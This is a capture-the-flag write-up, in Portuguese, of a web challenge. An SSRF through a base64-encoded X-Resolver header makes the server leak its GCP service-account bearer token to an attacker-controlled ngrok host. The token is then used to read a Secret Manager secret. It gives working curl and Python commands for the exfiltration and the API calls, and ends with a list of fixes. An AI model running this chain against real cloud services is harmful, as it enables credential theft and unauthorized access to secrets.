# PoC — Cloudy with a Chance of Spaceships (Web / SSRF → GCP, 67 pts) — #55

**Flag:** `CSSCTF{your_forecast_says_love_is_on_its_way}`

## Enunciado
> What's your forecast looking like? — `http://34.116.80.78:9143/`

App SvelteKit em Google Cloud. Placar de naves; clicar busca a "temperatura do casco".

## Cadeia de exploração (SSRF → roubo de token do service account → Secret Manager)

### 1. SSRF via header `X-Resolver`
O JS do app faz:
```js
fetch(`/api/v1/ship/${ship}/temperature`, { headers: { "X-Resolver": e } })
// e = "X" + base64({"resolver":"https://en.wikipedia.org/wiki/Space_weather"})
```
→ `X-Resolver = "X" + base64({"resolver":"<URL>"})`; o servidor faz **fetch dessa URL** (SSRF; só `http`/`https`).

### 2. Saída = oráculo de tamanho
A "temperatura" = **tamanho_do_corpo / 10** (independe do conteúdo). O app nunca devolve o corpo — descartado como canal de leitura direto (confirmado por fuzzing exaustivo de rotas, params, chaves do JSON e headers: nada devolve o corpo).

### 3. Vazamento do token GCP (a vuln real)
O cliente HTTP do servidor (`node-fetch`) anexa `Authorization: Bearer <access_token>` a **toda requisição de saída, para qualquer host**:
- `GET https://httpbin.org/bearer` direto → 401/0 bytes; via SSRF → 1068 bytes (token ecoado).
- Via oráculo: `httpbin/headers` = 1313 bytes vs 173 diretos → ~1140 bytes extras = o token.

### 4. Exfiltração do token (OOB)
A saída é só tamanho, então o token precisa ser capturado num endpoint externo.
- **Egress do app:** bloqueia oast.me/webhook.site (resolve DNS mas não conecta HTTP); **alcança** ngrok, beeceptor, pipedream/requestbin, githubusercontent, pastebin.
- Túnel **ngrok** → listener local. Disparo:
```bash
RES=$(python3 -c "import base64,json,sys;print('X'+base64.b64encode(json.dumps({'resolver':sys.argv[1]}).encode()).decode())" "https://<id>.ngrok-free.app/c")
curl -s -H "X-Resolver: $RES" "http://34.116.80.78:9143/api/v1/ship/x/temperature"
```
- O inspector do ngrok (`127.0.0.1:4040/api/requests/http`) capturou:
```
Authorization: Bearer ya29.c.c0AZ4bNp...   (access token, scope cloud-platform)
User-Agent: node-fetch/1.0
X-Forwarded-For: 34.116.80.78
```

### 5. Uso do token nas APIs GCP → flag
```bash
TOK=ya29.c.c0...
# tokeninfo: scope=cloud-platform, ~43min
curl "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$TOK"
# Resource Manager desabilitado, mas o erro vaza o PROJECT NUMBER 613713115850
curl -H "Authorization: Bearer $TOK" https://cloudresourcemanager.googleapis.com/v1/projects
# Secret Manager: 1 secret (project id css-ctf-2026, SA meteorologist@css-ctf-2026)
curl -H "Authorization: Bearer $TOK" \
  https://secretmanager.googleapis.com/v1/projects/613713115850/secrets
# Acessar o secret -> base64 da flag
curl -H "Authorization: Bearer $TOK" \
  "https://secretmanager.googleapis.com/v1/projects/613713115850/secrets/goog_encryption_secret/versions/latest:access" \
  | python3 -c "import sys,json,base64;print(base64.b64decode(json.load(sys.stdin)['payload']['data']).decode())"
# -> CSSCTF{your_forecast_says_love_is_on_its_way}
```

## Infra descoberta
- Projeto: **css-ctf-2026** (número `613713115850`)
- Service account: `meteorologist@css-ctf-2026.iam.gserviceaccount.com` (scope `cloud-platform`)
- Secret: `goog_encryption_secret` → a flag.

## Lição
- SSRF + cliente HTTP que anexa a credencial do service account a **destinos arbitrários** = roubo de token de cloud. Com `cloud-platform`, o token abre o Secret Manager e a flag.
- Transformar a resposta num escalar (tamanho) **não mitiga**: o vazamento está no *header de saída*, não no corpo.
- Correções: nunca anexar credenciais a URLs controladas pelo usuário; allowlist de hosts; bloquear IPs internos/link-local/metadata; least-privilege no SA (sem `cloud-platform`).

## Artefatos (scratchpad da sessão)
- `ssrf.py` (oráculo), `listener.py` (captura), `token.txt`, `secret.json`
